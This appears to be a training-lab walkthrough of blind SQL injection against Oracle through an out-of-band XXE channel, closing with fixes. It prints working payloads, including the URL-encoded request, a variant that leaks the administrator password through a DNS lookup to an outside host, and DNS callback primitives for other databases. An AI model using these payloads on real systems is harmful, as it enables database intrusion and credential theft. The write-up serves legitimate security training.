---
title: "Blind SQL injection with out-of-band interaction"
date: 2026-07-06 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, sql-injection, blind, oast, out-of-band, xxe, oracle, dns]
description: "The fifth blind SQLi oracle — when the app leaks nothing in-band (no message, no delay, no error), make the database server itself phone home. An Oracle XMLType external-entity trick fires a DNS lookup to a host you control. Plus the cookie-encoding gotcha that decides whether the payload parses at all."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Blind SQL injection with out-of-band interaction
---

## Overview

This lab closes out the blind [SQL injection](https://cwe.mitre.org/data/definitions/89.html) ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) series with the hardest case of all: an injection that leaks **nothing** through the HTTP response. The `TrackingId` cookie is concatenated into a backend Oracle query, but the result is never shown, the page is byte-identical whether your condition is true or false, there is no measurable time delay, and no database error reaches you. Every in-band oracle from the [four-oracles map]({% post_url 2026-07-05-Blind-SQL-injection-the-four-oracles %}) is blind here.

When the response channel is dead, you open a new one: make the **database server itself reach out over the network** to a host you control. This is **out-of-band application security testing (OAST)**.

## The idea: make the database phone home

If you can force the DB to perform a DNS lookup for a hostname you own, the lookup *arriving* at your DNS server proves the injection executed. The signal travels out-of-band — through DNS — instead of back through HTTP.

Oracle hands you this primitive through its XML functions. `EXTRACTVALUE()` parses an XML document, and if that document declares an **external entity**, Oracle's parser tries to fetch it over the network — which starts with a DNS resolution of the hostname. That is a textbook XXE, smuggled inside a SQL injection:

```sql
x' UNION SELECT EXTRACTVALUE(xmltype(
  '<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://abc123def456.oastify.com/"> %remote;]>'
),'/l') FROM dual--
```

The `%remote` parameter entity points at `http://abc123def456.oastify.com/`. The instant Oracle parses the document, it resolves that host — a DNS query lands at the Collaborator domain, and the lab is marked solved. (Oracle `SELECT` statements require a `FROM`, hence `FROM dual`.)

## The gotcha: the cookie is URL-decoded

This is the part that decides whether the attack works at all. The `TrackingId` cookie value is **URL-decoded by the application** before it reaches the SQL query. So the payload has to be delivered **URL-encoded**:

- `+` for each space
- `%25` for the literal `%` in `<!ENTITY %`
- `%3f` = `?`, `%3d` = `=`, `%3a` = `:`, `%3b` = `;`

Send it wrong and you can watch the failure in the status code:

- **Literal spaces + a raw `%`** → the server's decoder mangles the payload → broken SQL → **HTTP 500**. The XML never parses, so no DNS lookup ever fires.
- **Properly URL-encoded** → the server decodes it back into valid Oracle SQL → **HTTP 200**, the entity resolves, and the DNS query goes out.

The 200-vs-500 status is the only feedback you get that the payload even reached the parser.

## The working request

```http
GET / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//abc123def456.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Response: **200 OK**. A DNS interaction appears at the Collaborator domain within a few seconds, and the lab status flips to **Solved**.

One useful detail: you do **not** need Burp Suite Professional for the PortSwigger lab. Any `*.oastify.com` subdomain works, because PortSwigger runs the authoritative DNS for that zone and attributes the lookup to your lab instance. The Collaborator client is what you would use in a real engagement to confirm and inspect the interaction.

## Escalating from trigger to exfiltration

Triggering a lookup proves the bug. The next lab in the series turns it into data theft by **concatenating a secret into the subdomain**, so the stolen value appears inside the DNS query name your server logs:

```sql
...SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.abc123def456.oastify.com/"...
```

The DBMS-specific DNS primitives, for reference: Microsoft SQL Server uses `master..xp_dirtree '\\SUB.burpcollaborator.net\a'`, MySQL on Windows uses `LOAD_FILE('\\\\SUB\\a')`, and PostgreSQL goes through `dblink` or `COPY ... TO PROGRAM`.

## Why it matters and how to fix it

Out-of-band is the oracle of last resort precisely because it works when the target hides everything else — the detection signal lives entirely off-box, in your own infrastructure, which also makes it the stealthiest of the five oracles. The fix is the same as for every other SQLi:

- **Use parameterized queries / prepared statements.** Never concatenate the cookie into SQL. This removes the injection regardless of which oracle an attacker would have used.
- **Defence in depth:** disable external-entity resolution in the database's XML parser, and block outbound network egress from the database server, so even a residual injection cannot phone home.

This is [CWE-89](https://cwe.mitre.org/data/definitions/89.html) exploited through an XXE-style out-of-band channel.
